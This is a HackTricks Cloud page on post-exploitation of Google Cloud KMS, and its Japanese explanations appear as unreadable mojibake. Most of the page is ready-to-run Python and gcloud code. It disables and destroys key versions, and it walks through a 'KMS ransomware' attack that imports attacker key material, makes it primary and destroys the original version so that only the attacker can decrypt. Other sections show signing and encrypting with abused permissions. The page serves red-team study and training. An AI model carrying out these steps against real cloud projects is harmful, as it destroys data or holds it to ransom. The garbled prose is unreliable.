# GCP - KMS Post Exploitation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## KMS

KMSã«é–¢ã™ã‚‹åŸºæœ¬æƒ…å ±ã‚’è¦‹ã¤ã‘ã‚‹ã«ã¯ä»¥ä¸‹ã‚’å‚ç…§ã—ã¦ãã ã•ã„:

{% content-ref url="../gcp-services/gcp-kms-enum.md" %}
[gcp-kms-enum.md](../gcp-services/gcp-kms-enum.md)
{% endcontent-ref %}

### `cloudkms.cryptoKeyVersions.destroy`

ã“ã®æ¨©é™ã‚’æŒã¤æ”»æ’ƒè€…ã¯KMSãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’ç ´å£Šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã‚’è¡Œã†ã«ã¯ã€ã¾ãšã‚­ãƒ¼ã‚’ç„¡åŠ¹ã«ã—ã¦ã‹ã‚‰ç ´å£Šã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™:
```python
# pip install google-cloud-kms

from google.cloud import kms

def disable_key_version(project_id, location_id, key_ring_id, key_id, key_version):
"""
Disables a key version in Cloud KMS.
"""
# Create the client.
client = kms.KeyManagementServiceClient()

# Build the key version name.
key_version_name = client.crypto_key_version_path(project_id, location_id, key_ring_id, key_id, key_version)

# Call the API to disable the key version.
client.update_crypto_key_version(request={'crypto_key_version': {'name': key_version_name, 'state': kms.CryptoKeyVersion.State.DISABLED}})

def destroy_key_version(project_id, location_id, key_ring_id, key_id, key_version):
"""
Destroys a key version in Cloud KMS.
"""
# Create the client.
client = kms.KeyManagementServiceClient()

# Build the key version name.
key_version_name = client.crypto_key_version_path(project_id, location_id, key_ring_id, key_id, key_version)

# Call the API to destroy the key version.
client.destroy_crypto_key_version(request={'name': key_version_name})

# Example usage
project_id = 'your-project-id'
location_id = 'your-location'
key_ring_id = 'your-key-ring'
key_id = 'your-key-id'
key_version = '1'  # Version number to disable and destroy

# Disable the key version
disable_key_version(project_id, location_id, key_ring_id, key_id, key_version)

# Destroy the key version
destroy_key_version(project_id, location_id, key_ring_id, key_id, key_version)
```
### KMS Ransomware

AWSã§ã¯ã€KMSãƒªã‚½ãƒ¼ã‚¹ãƒãƒªã‚·ãƒ¼ã‚’å¤‰æ›´ã—ã€æ”»æ’ƒè€…ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã ã‘ãŒã‚­ãƒ¼ã‚’ä½¿ç”¨ã§ãã‚‹ã‚ˆã†ã«ã™ã‚‹ã“ã¨ã§ã€KMSã‚­ãƒ¼ã‚’å®Œå…¨ã«**ç›—ã‚€**ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚GCPã«ã¯ã“ã‚Œã‚‰ã®ãƒªã‚½ãƒ¼ã‚¹ãƒãƒªã‚·ãƒ¼ãŒå­˜åœ¨ã—ãªã„ãŸã‚ã€ã“ã‚Œã¯ä¸å¯èƒ½ã§ã™ã€‚

ã—ã‹ã—ã€ã‚°ãƒ­ãƒ¼ãƒãƒ«KMSãƒ©ãƒ³ã‚µãƒ ã‚¦ã‚§ã‚¢ã‚’å®Ÿè¡Œã™ã‚‹åˆ¥ã®æ–¹æ³•ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã«ã¯æ¬¡ã®ã‚¹ãƒ†ãƒƒãƒ—ãŒå«ã¾ã‚Œã¾ã™ï¼š

* æ”»æ’ƒè€…ãŒã‚¤ãƒ³ãƒãƒ¼ãƒˆã—ãŸ**ã‚­ãƒ¼ç´ æã‚’æŒã¤æ–°ã—ã„ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®ã‚­ãƒ¼ã‚’ä½œæˆã™ã‚‹**

{% code overflow="wrap" %}
```bash
gcloud kms import-jobs create [IMPORT_JOB] --location [LOCATION] --keyring [KEY_RING] --import-method [IMPORT_METHOD] --protection-level [PROTECTION_LEVEL] --target-key [KEY]
```
{% endcode %}

* **ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒãƒ¼ã‚¸ãƒ§ãƒ³**ã¨ã—ã¦è¨­å®šã™ã‚‹ï¼ˆä»Šå¾Œæš—å·åŒ–ã•ã‚Œã‚‹ãƒ‡ãƒ¼ã‚¿ã«å¯¾ã—ã¦ï¼‰
* ä»¥å‰ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã§æš—å·åŒ–ã•ã‚ŒãŸ**å¤ã„ãƒ‡ãƒ¼ã‚¿ã‚’å†æš—å·åŒ–**ã™ã‚‹
* **KMSã‚­ãƒ¼ã‚’å‰Šé™¤**ã™ã‚‹
* ã“ã‚Œã§ã€å…ƒã®ã‚­ãƒ¼ç´ æã‚’æŒã£ã¦ã„ã‚‹æ”»æ’ƒè€…ã ã‘ãŒæš—å·åŒ–ã•ã‚ŒãŸãƒ‡ãƒ¼ã‚¿ã‚’å¾©å·ã§ãã‚‹ã‚ˆã†ã«ãªã‚‹

#### æ–°ã—ã„ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’ã‚¤ãƒ³ãƒãƒ¼ãƒˆã—ã€å¤ã„ãƒ‡ãƒ¼ã‚¿ã‚’ç„¡åŠ¹åŒ–/å‰Šé™¤ã™ã‚‹æ‰‹é †ã¯ä»¥ä¸‹ã®é€šã‚Šã§ã™:
```bash
# Encrypt something with the original key
echo "This is a sample text to encrypt" > /tmp/my-plaintext-file.txt
gcloud kms encrypt \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--plaintext-file my-plaintext-file.txt \
--ciphertext-file my-encrypted-file.enc

# Decrypt it
gcloud kms decrypt \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--ciphertext-file my-encrypted-file.enc \
--plaintext-file -


# Create an Import Job
gcloud kms import-jobs create my-import-job \
--location us-central1 \
--keyring kms-lab-2-keyring \
--import-method "rsa-oaep-3072-sha1-aes-256" \
--protection-level "software"

# Generate key material
openssl rand -out my-key-material.bin 32

# Import the Key Material (it's encrypted with an asymetrict key of the import job previous to be sent)
gcloud kms keys versions import \
--import-job my-import-job \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--algorithm "google-symmetric-encryption" \
--target-key-file my-key-material.bin

# Get versions
gcloud kms keys versions list \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key

# Make new version primary
gcloud kms keys update \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--primary-version 2

# Try to decrypt again (error)
gcloud kms decrypt \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--ciphertext-file my-encrypted-file.enc \
--plaintext-file -

# Disable initial version
gcloud kms keys versions disable \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key 1

# Destroy the old version
gcloud kms keys versions destroy \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--version 1

```
### `cloudkms.cryptoKeyVersions.useToEncrypt` | `cloudkms.cryptoKeyVersions.useToEncryptViaDelegation`

ã“ã‚Œã‚‰ã®æ¨©é™ã¯ã€Cloud KMS éµã‚’ä½¿ç”¨ã—ã¦ãƒ‡ãƒ¼ã‚¿ã‚’æš—å·åŒ–ã™ã‚‹ãŸã‚ã«å¿…è¦ã§ã™ã€‚ãƒã‚¹ãƒˆã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã®ã‚·ãƒŠãƒªã‚ªã§ã¯ã€ã“ã‚Œã‚‰ã®æ¨©é™ã‚’æŒã¤ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚„ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã‚Œã°ã€æ©Ÿå¯†ãƒ‡ãƒ¼ã‚¿ã‚’æš—å·åŒ–ã—ã¦éš è”½ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚

#### åˆ©ç”¨ä¾‹

```bash
gcloud kms encrypt \
  --location=global \
  --keyring=my-keyring \
  --key=my-key \
  --plaintext-file=example.txt \
  --ciphertext-file=example.txt.enc
```

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€`example.txt` ãƒ•ã‚¡ã‚¤ãƒ«ã‚’æŒ‡å®šã•ã‚ŒãŸéµã§æš—å·åŒ–ã—ã€çµæœã‚’ `example.txt.enc` ãƒ•ã‚¡ã‚¤ãƒ«ã«ä¿å­˜ã—ã¾ã™ã€‚
```python
from google.cloud import kms
import base64

def encrypt_symmetric(project_id, location_id, key_ring_id, key_id, plaintext):
"""
Encrypts data using a symmetric key from Cloud KMS.
"""
# Create the client.
client = kms.KeyManagementServiceClient()

# Build the key name.
key_name = client.crypto_key_path(project_id, location_id, key_ring_id, key_id)

# Convert the plaintext to bytes.
plaintext_bytes = plaintext.encode('utf-8')

# Call the API.
encrypt_response = client.encrypt(request={'name': key_name, 'plaintext': plaintext_bytes})
ciphertext = encrypt_response.ciphertext

# Optional: Encode the ciphertext to base64 for easier handling.
return base64.b64encode(ciphertext)

# Example usage
project_id = 'your-project-id'
location_id = 'your-location'
key_ring_id = 'your-key-ring'
key_id = 'your-key-id'
plaintext = 'your-data-to-encrypt'

ciphertext = encrypt_symmetric(project_id, location_id, key_ring_id, key_id, plaintext)
print('Ciphertext:', ciphertext)
```
### `cloudkms.cryptoKeyVersions.useToSign`

`cloudkms.cryptoKeyVersions.useToSign` æ¨©é™ã¯ã€æ”»æ’ƒè€…ãŒ Cloud KMS éµã‚’ä½¿ç”¨ã—ã¦ãƒ‡ãƒ¼ã‚¿ã«ç½²åã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯ä¿¡é ¼ã§ãã‚‹ã‚½ãƒ¼ã‚¹ã‹ã‚‰ã®ã‚‚ã®ã§ã‚ã‚‹ã‹ã®ã‚ˆã†ã«è¦‹ãˆã‚‹ãƒ‡ãƒ¼ã‚¿ã‚’ä½œæˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

#### å½±éŸ¿

ã“ã®æ¨©é™ã‚’æŒã¤æ”»æ’ƒè€…ã¯ã€æ¬¡ã®ã“ã¨ãŒå¯èƒ½ã§ã™:

- ãƒ‡ãƒ¼ã‚¿ã®æ•´åˆæ€§ã‚’å½è£…ã™ã‚‹
- èªè¨¼ãƒ—ãƒ­ã‚»ã‚¹ã‚’å›é¿ã™ã‚‹
- ä»–ã®ã‚·ã‚¹ãƒ†ãƒ ã‚„ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’æ¬ºã

#### å¯¾ç­–

- æœ€å°æ¨©é™ã®åŸå‰‡ã‚’é©ç”¨ã™ã‚‹
- å®šæœŸçš„ãªæ¨©é™ã®ãƒ¬ãƒ“ãƒ¥ãƒ¼ã¨ç›£æŸ»
- Cloud KMS éµã®ä½¿ç”¨ã‚’ç›£è¦–ã™ã‚‹

#### ä¾‹

ä»¥ä¸‹ã¯ã€`cloudkms.cryptoKeyVersions.useToSign` æ¨©é™ã‚’ä½¿ç”¨ã—ã¦ãƒ‡ãƒ¼ã‚¿ã«ç½²åã™ã‚‹ä¾‹ã§ã™:

```bash
gcloud kms keys versions sign --key <KEY_NAME> --keyring <KEYRING_NAME> --location <LOCATION> --input-file <INPUT_FILE> --output-file <OUTPUT_FILE>
```

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€æŒ‡å®šã•ã‚ŒãŸéµã‚’ä½¿ç”¨ã—ã¦å…¥åŠ›ãƒ•ã‚¡ã‚¤ãƒ«ã«ç½²åã—ã€å‡ºåŠ›ãƒ•ã‚¡ã‚¤ãƒ«ã«ä¿å­˜ã—ã¾ã™ã€‚
```python
import hashlib
from google.cloud import kms

def sign_asymmetric(project_id, location_id, key_ring_id, key_id, key_version, message):
"""
Sign a message using an asymmetric key version from Cloud KMS.
"""
# Create the client.
client = kms.KeyManagementServiceClient()

# Build the key version name.
key_version_name = client.crypto_key_version_path(project_id, location_id, key_ring_id, key_id, key_version)

# Convert the message to bytes and calculate the digest.
message_bytes = message.encode('utf-8')
digest = {'sha256': hashlib.sha256(message_bytes).digest()}

# Call the API to sign the digest.
sign_response = client.asymmetric_sign(name=key_version_name, digest=digest)
return sign_response.signature

# Example usage for signing
project_id = 'your-project-id'
location_id = 'your-location'
key_ring_id = 'your-key-ring'
key_id = 'your-key-id'
key_version = '1'
message = 'your-message'

signature = sign_asymmetric(project_id, location_id, key_ring_id, key_id, key_version, message)
print('Signature:', signature)
```
### `cloudkms.cryptoKeyVersions.useToVerify`

`cloudkms.cryptoKeyVersions.useToVerify` æ¨©é™ã¯ã€æŒ‡å®šã•ã‚ŒãŸéµãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ã¦ãƒ‡ã‚¸ã‚¿ãƒ«ç½²åã‚’æ¤œè¨¼ã™ã‚‹ãŸã‚ã«å¿…è¦ã§ã™ã€‚ã“ã®æ¨©é™ã‚’æŒã¤ã“ã¨ã§ã€æ”»æ’ƒè€…ã¯ç½²åã®æœ‰åŠ¹æ€§ã‚’ç¢ºèªã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

#### IAMãƒãƒªã‚·ãƒ¼ã®æ¤œç´¢

æ”»æ’ƒè€…ã¯ã€`cloudkms.cryptoKeyVersions.useToVerify` æ¨©é™ã‚’æŒã¤IAMãƒãƒªã‚·ãƒ¼ã‚’æ¤œç´¢ã™ã‚‹ã“ã¨ã§ã€ã©ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚„ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãŒã“ã®æ¨©é™ã‚’æŒã£ã¦ã„ã‚‹ã‹ã‚’ç‰¹å®šã§ãã¾ã™ã€‚ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆå†…ã®ã™ã¹ã¦ã®IAMãƒãƒªã‚·ãƒ¼ã‚’ãƒªã‚¹ãƒˆã‚¢ãƒƒãƒ—ã—ã€`cloudkms.cryptoKeyVersions.useToVerify` æ¨©é™ã‚’æŒã¤ã‚¨ãƒ³ãƒˆãƒªã‚’ãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ã—ã¾ã™ã€‚

```bash
gcloud projects get-iam-policy [PROJECT_ID] --format=json | jq '.bindings[] | select(.role=="roles/cloudkms.cryptoKeyVersions.useToVerify")'
```

#### éµãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®ãƒªã‚¹ãƒˆ

æ”»æ’ƒè€…ã¯ã€`cloudkms.cryptoKeyVersions.useToVerify` æ¨©é™ã‚’æŒã¤éµãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’ãƒªã‚¹ãƒˆã‚¢ãƒƒãƒ—ã™ã‚‹ã“ã¨ã§ã€ã©ã®éµãŒç½²åã®æ¤œè¨¼ã«ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ã‹ã‚’ç¢ºèªã§ãã¾ã™ã€‚ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆå†…ã®ã™ã¹ã¦ã®éµãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’ãƒªã‚¹ãƒˆã‚¢ãƒƒãƒ—ã—ã¾ã™ã€‚

```bash
gcloud kms keys versions list --location [LOCATION] --keyring [KEYRING_NAME] --key [KEY_NAME]
```

#### ç½²åã®æ¤œè¨¼

æ”»æ’ƒè€…ã¯ã€`cloudkms.cryptoKeyVersions.useToVerify` æ¨©é™ã‚’ä½¿ç”¨ã—ã¦ã€ç‰¹å®šã®ãƒ‡ã‚¸ã‚¿ãƒ«ç½²åã®æœ‰åŠ¹æ€§ã‚’æ¤œè¨¼ã§ãã¾ã™ã€‚ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€ç½²åã‚’æ¤œè¨¼ã—ã¾ã™ã€‚

```bash
gcloud kms keys versions verify --location [LOCATION] --keyring [KEYRING_NAME] --key [KEY_NAME] --version [VERSION] --signature-file [SIGNATURE_FILE] --message-file [MESSAGE_FILE]
```
```python
from google.cloud import kms
import hashlib

def verify_asymmetric_signature(project_id, location_id, key_ring_id, key_id, key_version, message, signature):
"""
Verify a signature using an asymmetric key version from Cloud KMS.
"""
# Create the client.
client = kms.KeyManagementServiceClient()

# Build the key version name.
key_version_name = client.crypto_key_version_path(project_id, location_id, key_ring_id, key_id, key_version)

# Convert the message to bytes and calculate the digest.
message_bytes = message.encode('utf-8')
digest = {'sha256': hashlib.sha256(message_bytes).digest()}

# Build the verify request and call the API.
verify_response = client.asymmetric_verify(name=key_version_name, digest=digest, signature=signature)
return verify_response.success

# Example usage for verification
verified = verify_asymmetric_signature(project_id, location_id, key_ring_id, key_id, key_version, message, signature)
print('Verified:', verified)
```
{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ï¼
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f) ã¾ãŸã¯ [**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass) ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ ã§ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live) ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚
* **PRã‚’æå‡ºã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹** [**HackTricks**](https://github.com/carlospolop/hacktricks) ãŠã‚ˆã³ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubãƒªãƒã‚¸ãƒˆãƒªã€‚

</details>
{% endhint %}
